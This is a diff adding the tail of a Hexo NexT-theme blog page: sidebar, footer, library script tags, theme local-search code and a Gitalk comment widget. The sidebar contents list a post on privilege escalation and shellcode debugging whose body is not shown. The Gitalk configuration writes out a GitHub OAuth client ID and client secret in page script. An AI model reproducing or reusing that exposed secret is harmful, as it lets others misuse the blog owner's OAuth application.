+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+  <div id="gitalk-container">
+  </div>
+
+  
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sh1ner" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ftrcjq@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#提权原理"><span class="nav-number">1.</span> <span class="nav-text">提权原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shellcode调试"><span class="nav-number">2.</span> <span class="nav-text">shellcode调试</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: '3e46d70ce27cadc03165',
+          clientSecret: 'b49765fcc4d70e6af647ded4fd819972903ad727',
+          repo: 'sh1ner.github.io',
+          owner: 'sh1ner',
+          admin: ['sh1ner'],
+          id: location.pathname,
+          distractionFreeMode: 'true'
+        })
+        gitalk.render('gitalk-container')           
+       </script>
+
+.gt-container a{border-bottom: none;}
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
